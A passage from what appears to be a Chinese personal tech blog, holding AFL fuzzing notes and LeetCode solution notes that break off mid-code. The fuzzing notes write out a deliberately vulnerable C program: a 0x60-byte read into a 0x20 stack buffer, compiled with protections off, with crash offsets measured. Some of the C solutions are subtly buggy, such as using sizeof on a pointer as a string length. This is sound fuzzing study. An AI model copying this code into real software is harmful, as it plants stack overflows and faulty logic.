<li><p>在<code>IDEA</code>中按两下<code>shift</code>键可以快速搜索项目中的类</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122110956487.png" alt="image-20221122110956487"></p>
</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/09/30/AFL/">AFL</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-10-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、简单测试"   >
          <a href="#一、简单测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、简单测试" class="headerlink" title="一、简单测试"></a>一、简单测试</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You get it!\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-基础尝试"   >
          <a href="#1-基础尝试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基础尝试" class="headerlink" title="1.基础尝试"></a>1.基础尝试</h2>
      
        <h3 id="1-白盒"   >
          <a href="#1-白盒" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-白盒" class="headerlink" title="(1)白盒"></a>(1)白盒</h3>
      
        <h4 id="①基础"   >
          <a href="#①基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#①基础" class="headerlink" title="①基础"></a>①基础</h4>
      <p>首先使用简单的<code>afl-clang-fast</code>来编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test</span><br></pre></td></tr></table></div></figure>

<p>然后跑起来，速度大约是<code>11.6k</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930135610901.png" alt="image-20220930135610901"></p>
<p>大概跑了6分钟，出现了第一个crash，查看一下，是大小为0x76</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930140345079.png" alt="image-20220930140345079"></p>
<p>然后蒸馏一下<code>afl-tmin -i inputSeed -o outSeed programer</code> </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930141806144.png" alt="image-20220930141806144"></p>
<p>大小变为了<code>0x2d</code>，减去开始的4个字节，为<code>0x29</code>，再看看IDA反汇编出来的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142125276.png" alt="image-20220930142125276"></p>
<p>可以看到确实距离<code>rbp</code>为<code>0x28</code>，多溢出一个字节就可以覆盖到<code>rbp</code>了。</p>
<p>此外设置的标志<code>int v4</code>也在<code>buf</code>上面，而非正常编译的先声明的更靠近栈底。</p>
<p>另外实际<code>gdb</code>调试的，其<code>main</code>函数栈不再是通过<code>leave ret</code>来返回了，而是直接<code>add rsp 0x38</code>，而<code>rbp</code>为0</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142617012.png" alt="image-20220930142617012"></p>
<p><code>main</code>函数实际的返回地址距离<code>buf</code>为<code>0x28</code>倒是也能说的过去，就是不知道为什么要这么做。</p>

        <h4 id="②尝试-AFL-INIT"   >
          <a href="#②尝试-AFL-INIT" class="heading-link"><i class="fas fa-link"></i></a><a href="#②尝试-AFL-INIT" class="headerlink" title="②尝试__AFL_INIT()"></a>②尝试__AFL_INIT()</h4>
      <p>在源码中加入<code>__AFL_INIT()</code>，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213431" >sakuraのAFL源码全注释（二）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254167#h2-3" >AFL-Training学习记录-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>sakura师傅</code>介绍说，目的是为了在某些情况下可以减少操作系统、链接与libc内部执行程序的成本</p>
<p><code>iskindar师傅</code>介绍说，这是采用<code>Deferred initialization</code>的方式来提高AFL的性能，大概提高1.5x，最合适的地方是放在<code>read</code>函数前。也就是下面这几行代码。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">  __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>放入进去</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You get it!\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">        __AFL_INIT();</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>之后正常编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test</span><br></pre></td></tr></table></div></figure>

<p>也相差无几，可能是程序太小，相关的<code>libc</code>库调用太少吧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930143810066.png" alt="image-20220930143810066"></p>
<p>发现crash之后蒸馏得到的和不加<code>__AFL_INIT()</code>是一样的。</p>

        <h4 id="③尝试-AFL-LOOP-1000"   >
          <a href="#③尝试-AFL-LOOP-1000" class="heading-link"><i class="fas fa-link"></i></a><a href="#③尝试-AFL-LOOP-1000" class="headerlink" title="③尝试__AFL_LOOP(1000)"></a>③尝试__AFL_LOOP(1000)</h4>
      <p><code>persistent</code>模式，常常用来<code>fuzz</code>某些无状态的<code>API</code></p>
<p><code>iskindar师傅</code>介绍说，对于一些无状态的<code>API</code>库，可以复用进程来测试多个测试样例，从而减少fork系统调用的使用，进而减少OS的开销。</p>
<ul>
<li>状态：指的是交互过程中保存的会话信息，比如<code>cookie、session</code>等</li>
</ul>
<p>那么无状态的<code>API</code>指的就是在这个<code>API</code>里没有保存状态了。</p>
<p>先不使用<code>__AFL_LOOP</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x60</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">   __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//read(0,buf,0x60);</span></span><br><span class="line">    vul(&amp;a,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>库如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">int</span>* flag,<span class="keyword">char</span>* data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">if</span>(*flag == <span class="number">0x1234</span>)&#123;</span><br><span class="line">        <span class="comment">//strcpy(buf,data);</span></span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>编译加<code>FUZZ</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./testNoLoopAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_noLoop_test</span><br><span class="line">afl-fuzz -i otherIn -o afl_API_noLoop_out ./afl_API_noLoop_test</span><br></pre></td></tr></table></div></figure>

<p>开始运行之后会有<code>(odd, check syntax!)</code>，但是运行一段时间后就没有了，不太知道为啥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930194310537.png" alt="image-20220930194310537"></p>
<p>最后大概五六分钟也能得到<code>crash</code></p>
<p>加入<code>__AFL_LOOP</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;noStateAPI.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x60</span>];</span><br><span class="line">    </span><br><span class="line">    read(<span class="number">0</span>,&amp;a,<span class="number">4</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        vul(&amp;a,buf);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">    &#125;   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后编译<code>FUZZ</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-fast ./testAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_test</span><br><span class="line">afl-fuzz -i otherIn -o afl_API_out ./afl_API_test</span><br></pre></td></tr></table></div></figure>

<p>但是这个跑一个小时都没出结果，很奇怪，不知道为什么，难道说有<code>read</code>或者有比对值的代码</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(*flag == <span class="number">0x1234</span>)&#123;</span><br><span class="line">    <span class="comment">//strcpy(buf,data);</span></span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>就代表是有状态的<code>API</code>吗</p>

        <h3 id="2-黑盒"   >
          <a href="#2-黑盒" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-黑盒" class="headerlink" title="(2)黑盒"></a>(2)黑盒</h3>
      <p>此外使用正常的<code>gcc</code>编译后，采用黑盒测试时</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -Q -i in -o hei_out ./test</span><br></pre></td></tr></table></div></figure>

<p>速度下降一大截</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142948733.png" alt="image-20220930142948733"></p>
<p>不过还是能够发现<code>crash</code>，大概跑了十五六分钟。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144540473.png" alt="image-20220930144540473"></p>
<p>可以看到大小是<code>0x4f</code>，减去标志的4个字节即为<code>0x4b</code>，与期待的大概<code>0x39</code>字节还是相差一点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144649388.png" alt="image-20220930144649388"></p>
<p>此外黑盒好像没办法蒸馏</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144817799.png" alt="image-20220930144817799"></p>

        <h1 id="二、变异策略"   >
          <a href="#二、变异策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、变异策略" class="headerlink" title="二、变异策略"></a>二、变异策略</h1>
      <p>详见：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://rk700.github.io/2018/01/04/afl-mutations/" >AFL文件变异一览 - 记事本 (rk700.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/09/20/Leecode%E5%88%B7%E9%A2%98/">算法笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-09-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-11-27</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="LeetCode题目"   >
          <a href="#LeetCode题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#LeetCode题目" class="headerlink" title="LeetCode题目"></a>LeetCode题目</h1>
      
        <h2 id="两数之和"   >
          <a href="#两数之和" class="heading-link"><i class="fas fa-link"></i></a><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2>
      <p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911122050526.png" alt="image-20220911122050526"></p>
<p>遍历<code>nums</code>中的元素<code>num</code>，<code>num</code>索引为i，判定<code>target-num</code>这个元素是否在<code>nums[i+1,len(nums)]</code>，在则成功</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            flag = target - nums[i]</span><br><span class="line">            <span class="keyword">if</span>(flag <span class="keyword">in</span> nums[i+<span class="number">1</span>:<span class="built_in">len</span>(nums)]):</span><br><span class="line">                result.append(i)</span><br><span class="line">                result.append(nums.index(flag,i+<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></div></figure>

<p>C语言</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">twoSum</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target,<span class="keyword">int</span>* returnSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>* returnArray = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; numsSize ; i++)&#123;</span><br><span class="line">        flag = target - nums[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span> ; j &lt; numsSize ; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flag == nums[j])&#123;</span><br><span class="line">                returnArray[<span class="number">0</span>] = i;</span><br><span class="line">                returnArray[<span class="number">1</span>] = j;</span><br><span class="line">                *returnSize=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> returnArray;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="回文数"   >
          <a href="#回文数" class="heading-link"><i class="fas fa-link"></i></a><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2>
      <p>挨个计算其模<code>10</code>的余数，打造回文数，判断与原数是否相等</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num = x;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( num != <span class="number">0</span>)&#123;</span><br><span class="line">        cur = cur*<span class="number">10</span> + num%<span class="number">10</span>;</span><br><span class="line">        num /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cur == x)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="最长公共前缀"   >
          <a href="#最长公共前缀" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012215550610.png" alt="image-20221012215550610"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestCommonPrefix</span><span class="params">(<span class="keyword">char</span> ** strs, <span class="keyword">int</span> strsSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strsSize == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; strsSize ; j ++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">sizeof</span>(strs[j]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* ans = strs[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">char</span>* com = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">sizeof</span>(ans); i ++)&#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; strsSize ; j ++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] == strs[j][i])&#123;</span><br><span class="line">                flag += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == strsSize)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            len = flag;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans[len] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="两数相加"   >
          <a href="#两数相加" class="heading-link"><i class="fas fa-link"></i></a><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911184123445.png" alt="image-20220911184123445"></p>
<p>进位计算，通过<code>carry = sum / 10;</code>来获取进位，<code>sum = sum % 10;</code>获取进位之后的值，然后用头节点依次串联起来，注意写的时候不要用局部变量当作返回结点，而是再分配一块内存来当作返回结点变量，不然会出错，可能是局部变量被覆盖之类的吧。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/add-two-numbers/solution/hua-jie-suan-fa-2-liang-shu-xiang-jia-by-guanpengc/" >画解算法：2. 两数相加 - 两数相加 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">headNode</span> =</span> (struct ListNode*)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">curNode</span> =</span> headNode;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1 != <span class="literal">NULL</span> || l2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = l1 == <span class="literal">NULL</span> ? <span class="number">0</span> : l1-&gt;val;</span><br><span class="line">        <span class="keyword">int</span> y = l2 == <span class="literal">NULL</span> ? <span class="number">0</span> : l2-&gt;val;</span><br><span class="line">        sum = x + y + carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        sum = sum % <span class="number">10</span>;</span><br><span 